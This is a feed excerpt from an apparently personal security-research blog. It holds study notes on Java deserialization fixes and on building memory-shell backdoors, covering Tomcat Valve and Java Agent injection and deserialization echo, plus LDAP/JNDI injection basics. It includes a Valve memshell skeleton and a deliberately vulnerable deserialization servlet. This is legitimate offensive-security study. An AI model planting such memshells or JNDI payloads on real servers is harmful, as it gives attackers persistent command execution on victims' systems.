method</li><li>Write code for inserting memory shell in a static code block of a certain class(normally the memory shell class itself)</li><li>Select a script engine(JavaScript, BeanShell, Python, etc.). Prepare the script code in which define an evil class to insert memory shell and create a new instance to trigger the static code block</li><li>Execute script through deserialization vulnerability.</li></ol><hr><h2 id="Fixes"><a href="#Fixes" class="headerlink" title="Fixes"></a>Fixes</h2><h3 id="JDK-fixes"><a href="#JDK-fixes" class="headerlink" title="JDK fixes"></a>JDK fixes</h3><h4 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h4><p>This article[^1] introduces security updates for serialization in JDK1.8. In summary, there are three strengthening methods introduced in JDK1.8:</p><ol><li>Override <code>ObjectInputStream</code>‘s <code>resolveClass</code> or <code>resolveProxyClass</code> method</li><li>Use <code>ValidatingObjectInputStream</code> to decorate <code>ObjectInputStream</code> to deploy white-list validation</li><li>Create an <code>ObjectInputFilter</code> class overriding <code>checkInput</code> method, and decorate an <code>ObjectInputStream</code> via <code>setObjectInputFilter</code> method.</li></ol><h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a><code>AnnotationInvocationHandler</code></h4><p>Recall [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|the exploitation of CC1]], there are two handlers employed, one with a dynamic proxy as <code>memberValues</code>(i.e. outer handler) and another which is a member of the proxy object with a <code>LazyMap</code> as <code>memberValues</code>(i.e. inner handler). While deserialize, it comes in a depth-prior recursion, so the inner handler would be firstly deserialized, after all fields finish deserialization here comes to deserializing the proxy, later the outer handler.<br>Let’s take a look at the <code>AnnotationInvocationHandler</code>‘s <code>readObject</code> in JDK1.8:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; t = (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly  </span></span><br><span class="line">  </span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        annotationType = AnnotationType.getInstance(t);  </span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;  </span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out  </span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();  </span><br><span class="line">    <span class="comment">// consistent with runtime Map type  </span></span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// If there are annotation members without values, that  </span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.    for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);  </span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists  </span></span><br><span class="line">            value = memberValue.getValue();  </span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||  </span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;  </span><br><span class="line">                value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(  </span><br><span class="line">                            objectToString(value))  </span><br><span class="line">                    .setMember(annotationType.members().get(name));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        mv.put(name, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    UnsafeAccessor.setType(<span class="built_in">this</span>, t);  </span><br><span class="line">    UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The key action falls in the local variable <code>mv</code>, now <code>readObject</code> will always set the <code>memberValue</code> to <code>LinkedHashMap</code> whatever its type deserialized. So the <code>LazyMap</code> in our CC1 would not be effective.</p><hr><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><hr><h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><h3 id="How-to-test-Poc-Do-not-debug"><a href="#How-to-test-Poc-Do-not-debug" class="headerlink" title="How to test Poc? Do not debug!"></a>How to test Poc? Do not debug!</h3><p>IDEA debugger could ignite the key RCE code point, which will lead to confusion like: why does calculator start even before reaching the RCE code? The picture below is an proof that the debugger would call functions of current objects.<br>![[Pasted image 20231008160842.png]]</p><hr><h2 id="Journal"><a href="#Journal" class="headerlink" title="Journal"></a>Journal</h2><ul><li><input checked="" disabled="" type="checkbox"> CC8 not worked</li></ul><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[^1]: <a href="https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md">Paper&#x2F;浅谈Java反序列化漏洞修复方案.md at master · Cryin&#x2F;Paper</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Sinks&quot;&gt;&lt;a href=&quot;#Sinks&quot; class=&quot;headerlink&quot; title=&quot;Sinks&quot;&gt;&lt;/a&gt;Sinks&lt;/h1&gt;&lt;h2 id=&quot;TemplatesImpl-exploit&quot;&gt;&lt;a href=&quot;#TemplatesImpl-exploi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Memshell study, JNDI inject memshell, JNDI exploit tool development</title>
    <link href="http://padishah.github.io/2023/10/24/Pentest/Memshell%20study%20JNDI%20inject%20memshell%20JNDI%20exploit%20tool%20development/"/>
    <id>http://padishah.github.io/2023/10/24/Pentest/Memshell%20study%20JNDI%20inject%20memshell%20JNDI%20exploit%20tool%20development/</id>
    <published>2023-10-23T16:00:00.000Z</published>
    <updated>2023-10-24T04:48:41.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Repo"><a href="#Repo" class="headerlink" title="Repo"></a>Repo</h1><p><a href="https://github.com/PadishahIII/Spring-Memshell">Spring memshell</a></p><h1 id="Tomcat-memshell"><a href="#Tomcat-memshell" class="headerlink" title="Tomcat memshell"></a>Tomcat memshell</h1><h2 id="Debug-tomcat-source-code"><a href="#Debug-tomcat-source-code" class="headerlink" title="Debug tomcat source code"></a>Debug tomcat source code</h2><p>Download source code and follow build steps from <a href="https://tomcat.apache.org/tomcat-9.0-doc/building.html#Obtain_the_Tomcat_source_code">here</a>.<br>What’s important is that <strong>you cannot debug web application and tomcat source code simultaneously</strong>, because web application should be packaged into war and you should debug it in another IDEA window.<br>The current solution is: package the web application project into the <code>output/build/webapps</code> of  tomcat source code project, and configurate the VM option of tomcat source code project with <code>-Dcatalina.home=output/build</code>. As the result, you should only run debug of tomcat source code and package web application to update code, with Hotswap option on, it seems like you are debugging a single project.</p><h2 id="Tomcat-data-flow"><a href="#Tomcat-data-flow" class="headerlink" title="Tomcat data flow"></a>Tomcat data flow</h2><h3 id="Valve-Filter-Servlet"><a href="#Valve-Filter-Servlet" class="headerlink" title="Valve, Filter, Servlet"></a>Valve, Filter, Servlet</h3><p>After <code>Connector</code> parses Http request, control will pass to <code>Container</code>‘s pipeline, begin at <code>org.apache.catalina.connector.CoyoteAdapter#service</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p>Pipeline consists of several <code>Valve</code>, by default, the data flow is: <code>StandardEngineValve</code>, <code>StandardHostValve</code>, <code>StandardContextValve</code>, <code>StandardWrapperValve</code>, and in <code>StandardWrapperValve#invoke</code>, walk through <code>FilterChain</code> and finally call <code>Servlet#service</code>.</p><h2 id="Tomcat-memshell-1"><a href="#Tomcat-memshell-1" class="headerlink" title="Tomcat memshell"></a>Tomcat memshell</h2><h3 id="Valve-memshell"><a href="#Valve-memshell" class="headerlink" title="Valve memshell"></a>Valve memshell</h3><p>To dynamically create malicious Valve, we should clear out the Valve calling order.<br>The entry falls at <code>org.apache.catalina.connector.CoyoteAdapter#service</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p>Then falls into <code>org.apache.catalina.core.StandardEngineValve#invoke</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> request.getHost();</span><br><span class="line">...</span><br><span class="line">host.getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p>In <code>org.apache.catalina.core.StandardHostValve#invoke</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> request.getContext();</span><br><span class="line">...</span><br><span class="line">context.getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p>In which <code>context</code> should be a <code>StandardContext</code>  object. Conclusively, we can use <code>StandardContext#addValve</code> to insert a malicious Valve. In addition, Valve should call next valve in the pipeline:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemshellValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">...</span><br><span class="line">getNext().invoke(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After insert memshell Valve, <code>invoke</code> method will run at every single request, so you can execute command on every servlet of this context.</p><hr><h1 id="Java-Agent-memshell"><a href="#Java-Agent-memshell" class="headerlink" title="Java Agent memshell"></a>Java Agent memshell</h1><h2 id="Instrument"><a href="#Instrument" class="headerlink" title="Instrument"></a>Instrument</h2><p>Java Instrument package provide a way to add agents for a specific java method in a specific JVM. It’s similar to AOP. The type of java agent includes <code>premain</code> agent and <code>agentmain</code> agent. The <code>premain</code> agent can only be loaded at JVM start, and cannot be loaded to a already running JVM. The <code>agentmain</code> agent is able to be loaded to a running JVM dynamically, which is suited for memshell.</p><h2 id="Inject-Java-Agent"><a href="#Inject-Java-Agent" class="headerlink" title="Inject Java Agent"></a>Inject Java Agent</h2><p>To inject a java agent needs:</p><ul><li>A <code>ClassFileTransformer</code> class, in <code>transform</code> method, modify source code of target method</li><li>A class(e.g. <code>AgentMain</code>) with <code>agentmain</code> method implemented, retransform target class to spark transformer</li><li>Modify <code>MANIFEST.MF</code> of jar file to include <code>Agent-Class</code> option</li><li>With a arbitrary code execution entry, <code>attach</code> target JVM and load agent jar</li></ul><h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><h3 id="Cannot-use-com-sun-tools-attach-package-in-JDK8"><a href="#Cannot-use-com-sun-tools-attach-package-in-JDK8" class="headerlink" title="Cannot use com.sun.tools.attach package in JDK8"></a>Cannot use <code>com.sun.tools.attach</code> package in JDK8</h3><p>This package is supported on JDK11</p><h3 id="Cannot-use-javassist-package-on-target-server"><a href="#Cannot-use-javassist-package-on-target-server" class="headerlink" title="Cannot use javassist package on target server"></a>Cannot use <code>javassist</code> package on target server</h3><blockquote><p>[!FAIL] Not Solved<br><code>NoClassDefFoundError</code> for <code>javassist</code> classes when loading agent.<br>I intend to add jar file dynamically to ClassLoader but fail to find a way to obtain that.</p></blockquote><hr><h1 id="Deserialization-Echo-inject-memshell-via-deserialization-vuls"><a href="#Deserialization-Echo-inject-memshell-via-deserialization-vuls" class="headerlink" title="Deserialization Echo, inject memshell via deserialization vuls"></a>Deserialization Echo, inject memshell via deserialization vuls</h1><p>We can use deserialization vulnerabilities to execute arbitrary code, but can not get the execution result directly. Now that our malicious code is executed in a servlet, it is possible to obtain the Request and Response object of current servlet. Then we can either write the command execution result to response or inject a memshell into the server.</p><p>All of the work relies on the fact that we can use <code>Thread.currentThread()</code> to get a <code>TaskThread</code> whose <code>group</code> member is a reference to the <code>ThreadGroup</code> it locates in, and we can access all threads in the current thread group. We can ensure that the Request and Response object must exist in a certain thread of current thread group. So here comes a tool named <code>java-object-searcher</code> that filters objects by some conditions in current thread group, as first introduced in this article[^2] and then this article[^3].</p><h3 id="Use-java-object-searcher-to-find-Echo-class"><a href="#Use-java-object-searcher-to-find-Echo-class" class="headerlink" title="Use java-object-searcher to find Echo class"></a>Use java-object-searcher to find Echo class</h3><p>The basic usage is presented <a href="https://github.com/c0ny1/java-object-searcher">here</a>. To better look into this tool, I have copied the source code to the web project. You can also import by jar file.<br>First, we need to prepare a tomcat server vulnerable to deserialize vulnerability, e.g. <em>CommonBeanutils1</em> in <em>ysoserial</em>. Start the server in debug mode and add a break point at the <code>readObject</code> line. The servlet is as following:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/deserialize&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializeServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">decoder</span> <span class="operator">=</span> Base64.getDecoder();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">dataStr</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;data&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (dataStr != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="type">byte</span>[] data = decoder.decode(dataStr.toString());  </span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);  </span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();  </span><br><span class="line">  </span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">            res.append(String.format(<span class="string">&quot;Get object: %s&quot;</span>, obj.getClass().getName()));  </span><br><span class="line">  </span><br><span class="line">            resp.getWriter().println(res);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            resp.getWriter().println(<span class="string">&quot;data is empty&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;Exception:&quot;</span> + e.getClass().getName() + <span class="string">&quot;:&quot;</span> + e);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Send a post request with <code>data=(any base64 content)</code> in body. While intercepted at <code>readObject</code>, push <em>Alt+F8</em> in IDEA and evaluate the following code fragment:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;Request&quot;</span>).build());  </span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;RequestInfo&quot;</span>).build());  </span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;RequestGroup&quot;</span>).build());  </span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;RequestGroupInfo&quot;</span>).build());  </span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;ServletRequest&quot;</span>).build());  </span><br><span class="line">  </span><br><span class="line"><span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(), keys);  </span><br><span class="line">searcher.setIs_debug(<span class="literal">false</span>);  </span><br><span class="line">searcher.setMax_search_depth(<span class="number">20</span>);  </span><br><span class="line">searcher.setReport_save_path(<span class="string">&quot;D:\\Files\\Java_WorkSpace\\Webapp-for-tomcat9\\webapp-for-tomcat9&quot;</span>);  </span><br><span class="line">searcher.searchObject();</span><br></pre></td></tr></table></figure><p>After done without any exception, we can find the result in folder:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125;   </span><br><span class="line">  ---&gt; group = &#123;java.lang.ThreadGroup&#125;   </span><br><span class="line">   ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125;   </span><br><span class="line">    ---&gt; [3] = &#123;java.lang.Thread&#125;   </span><br><span class="line">     ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint$Poller&#125;   </span><br><span class="line">      ---&gt; this$0 = &#123;org.apache.tomcat.util.net.NioEndpoint&#125;   </span><br><span class="line">        ---&gt; handler = &#123;org.apache.coyote.AbstractProtocol$ConnectionHandler&#125;   </span><br><span class="line">         ---&gt; global = &#123;org.apache.coyote.RequestGroupInfo&#125;</span><br><span class="line"></span><br><span class="line">TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125;   </span><br><span class="line">  ---&gt; group = &#123;java.lang.ThreadGroup&#125;   </span><br><span class="line">   ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125;   </span><br><span class="line">    ---&gt; [3] = &#123;java.lang.Thread&#125;   </span><br><span class="line">     ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint$Poller&#125;   </span><br><span class="line">      ---&gt; this$0 = &#123;org.apache.tomcat.util.net.NioEndpoint&#125;   </span><br><span class="line">        ---&gt; handler = &#123;org.apache.coyote.AbstractProtocol$ConnectionHandler&#125;   </span><br><span class="line">         ---&gt; global = &#123;org.apache.coyote.RequestGroupInfo&#125;   </span><br><span class="line">          ---&gt; processors = &#123;java.util.ArrayList&lt;org.apache.coyote.RequestInfo&gt;&#125;   </span><br><span class="line">           ---&gt; [0] = &#123;org.apache.coyote.RequestInfo&#125;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>The <code>TargetObject</code> of each chain is the start point for searching. Every line presents a member of parent. And in the last row we can find the target class.<br>Next I will reproduce the first chain as above to get the echo from deserialization vul.</p><p>#TODO</p><hr><h1 id="JNDI-Injection-Basic"><a href="#JNDI-Injection-Basic" class="headerlink" title="JNDI Injection Basic"></a>JNDI Injection Basic</h1><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="Concepts"><a href="#Concepts" class="headerlink" title="Concepts"></a>Concepts</h4><p><em><strong>Entry</strong></em> is a collection of information about an entity. Each <em>entry</em> consists of three primary components: a DN, a collection of attributes and a collection of object classes.</p><p><strong>DN</strong>(Distinguished name) is comprised of RDNs(Relative DN). <strong>RDN</strong> is comprised of <em><strong>Attributes</strong></em>. In RDN, attributes are separated by plus sign. In DN, RDNs are separated by comma. The order of RDNs specifies the position of the associated entry in the <strong>DIT</strong>(Directory information tree). The list of RDN grows to the left.<br>Example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RDN1: uid=john.doe</span><br><span class="line">RDN2: givenName=John+sn=Doe</span><br><span class="line">DN1: uid=john.doe,ou=People,dc=example,dc=com</span><br><span class="line">DN2: ou=People,dc=example,dc=com</span><br><span class="line">(DN2 is the parent of DN1.)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><em><strong>Schema</strong></em> is the configuration of LDAP server. LDAP bind requests should follow the conduct specified by the schema. When creating an <code>InMemoryDirectoryServer</code>, the schema should be loaded explicitly otherwise any <code>bind()</code> action would fail. Or we can set server’s schema to null.</p><p>LDAP only supports storing objects in any type of <code>Serializable</code>, <code>Referencable</code> or <code>DirContext</code>. </p><h4 id="Start-a-LDAP-server"><a href="#Start-a-LDAP-server" class="headerlink" title="Start a LDAP server"></a>Start a LDAP server</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">2389</span>;  </span><br><span class="line"><span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">serverConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(<span class="string">&quot;dc=example,dc=com&quot;</span>);  </span><br><span class="line">serverConfig.setSchema(<span class="literal">null</span>);  </span><br><span class="line">serverConfig.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">        <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line">        InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line">        port,  </span><br><span class="line">        ServerSocketFactory.getDefault(),  </span><br><span class="line">        SocketFactory.getDefault(),  </span><br><span class="line">        (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line"><span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(serverConfig);  </span><br><span class="line">ds.startListening();</span><br></pre></td></tr></table></figure><h4 id="Store-and-request-Serializable-objects"><a href="#Store-and-request-Serializable-objects" class="headerlink" title="Store and request Serializable objects"></a>Store and request Serializable objects</h4><blockquote><p>[!NOTE] restrictions<br>The class of object in LDAP serializable entry must exist in client’s class path.<br>Exploitation by serializable entry only take effect along with client’s serialization vulnerability.</p></blockquote><p>How to bind a serializable object into LDAP server is shown as below. Actually, only <code>javaClassName</code> attribute is mandatory.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="keyword">class</span> <span class="title class_">Flower</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">BasicAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicAttributes</span>();  </span><br><span class="line">attributes.put(<span class="string">&quot;javaClassName&quot;</span>, Flower.class.getName());  </span><br><span class="line">attributes.put(<span class="string">&quot;javaSerializedData&quot;</span>, bytes);  </span><br><span class="line">attributes.put(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaSerializedObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    ctx.bind(<span class="string">&quot;dc=example,dc=com&quot;</span>, f, attributes);  </span><br><span class="line">&#125; <span class="keyword">catch</span> (NameAlreadyBoundException e) &#123;  </span><br><span class="line">    System.out.println(<span class="string">&quot;Flower already exists, rebind...&quot;</span>);  </span><br><span class="line">    ctx.rebind(<span class="string">&quot;dc=example,dc=com&quot;</span>, f, attributes);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Request a serializable object:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">f2</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;dc=example,dc=com&quot;</span>);  </span><br><span class="line">System.out.println(f2);</span><br></pre></td></tr></table></figure><p>If the target class exists in client’s class path, then the serialization process starts.</p><h4 id="Referenceable-objects-remote-classloading-via-codebase"><a href="#Referenceable-objects-remote-classloading-via-codebase" class="headerlink" title="Referenceable objects, remote classloading via codebase"></a>Referenceable objects, remote classloading via codebase</h4><blockquote><p>[!NOTE] Restrictions<br>The remote classloading functionality is only included in Oracle JDK. In OpenJDK, you will find there is even no source code about this functionality.<br>After JDK8u191, JDK will check <code>trustURLCodebase</code> before requesting from 